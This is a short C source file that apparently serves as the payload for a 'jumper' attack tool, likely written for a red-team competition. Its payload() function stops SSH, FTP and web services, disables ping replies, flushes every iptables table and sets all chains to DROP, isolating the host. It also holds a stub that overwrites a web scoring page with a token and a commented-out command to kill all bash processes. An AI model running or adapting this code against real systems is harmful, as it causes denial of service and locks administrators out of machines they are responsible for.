//Michael Burke
//Payload for the jumper. Anything in payload() will be executed.

void stopServices(){
    system("systemctl stop sshd 2>/dev/null");
    system("systemctl stop vsftpd 2>/dev/null");
    system("systemctl stop nginx 2>/dev/null");
    system("systemctl stop apache2 2>/dev/null");
    system("echo 1 > /proc/sys/net/ipv4/icmp_echo_ignore_all");
    //This one is just evil
    //system("killall bash");
}

void dropAllFirewall(){
    //Flush iptables rules
    system("iptables -Z");
    system("iptables -F");
    system("iptables -X");

    system("iptables -Z -t mangle");
    system("iptables -F -t mangle");
    system("iptables -X -t mangle");

    system("iptables -Z -t nat");
    system("iptables -F -t nat");
    system("iptables -X -t nat");

    system("iptables -Z -t filter");
    system("iptables -F -t filter");
    system("iptables -X -t filter");

    system("iptables -Z -t raw");
    system("iptables -F -t raw");
    system("iptables -X -t raw");
    
    //Establish drop rules
    system("iptables -P INPUT DROP");
    system("iptables -P OUTPUT DROP");
    system("iptables -P FORWARD DROP");
    
    system("iptables -t mangle -P INPUT DROP");
    system("iptables -t mangle -P OUTPUT DROP");
    system("iptables -t mangle -P PREROUTING DROP");
    system("iptables -t mangle -P POSTROUTING DROP");
    system("iptables -t mangle -P FORWARD DROP");
    
    system("iptables -t filter -P INPUT DROP");
    system("iptables -t filter -P OUTPUT DROP");
    system("iptables -t filter -P FORWARD DROP");
    
    system("iptables -t raw -P OUTPUT DROP");
    system("iptables -t raw -P PREROUTING DROP");
}

void deployToken(){
    char* token = "TOKENHERE";
    char* prefix = "";
    char* suffix = "";
    char cmd[500] = "";
    int method = 0;

    if (method) {
        system("chmod -i /var/www/html/scoring.html");
        FILE *fptr;
        fptr = fopen("/var/www/html/scoring.html", "w");
        fprintf(fptr, "%s", token);
    } else {
        
    }
    



}


int payload(){
    //printf("Evil payload executed >:)\n");
    stopServices();
    dropAllFirewall();
    //Execute whatever the hell you want here
    return 0;
}